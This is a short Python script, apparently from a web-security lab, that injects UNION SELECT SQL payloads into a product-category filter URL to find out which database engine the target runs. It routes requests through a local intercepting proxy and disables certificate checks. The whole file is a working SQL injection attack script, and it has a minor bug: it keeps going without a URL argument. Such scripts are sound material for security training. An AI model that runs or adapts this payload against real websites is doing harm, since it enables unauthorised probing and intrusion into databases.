import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def find_version(url):
    path = '/filter?category=Gifts'
    dict = {'Microsoft':'@@version', 'PostgreSQL':'version()', 'MySQL':'@@version', 'Oracle': 'banner+FROM+v$version'}
    for k,v in dict.items():
        payload = f"'+UNION+SELECT+NULL,{v}-- "
        r = requests.get(url+path+payload, verify = False, proxies = proxies)
        if r.status_code == 200:
            print("(+) %s query found"%k)
        else:
            pass



if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python %s <url> " %sys.argv[0])
        print("Example: python %s example.com " %sys.argv[0])
    find_version(url)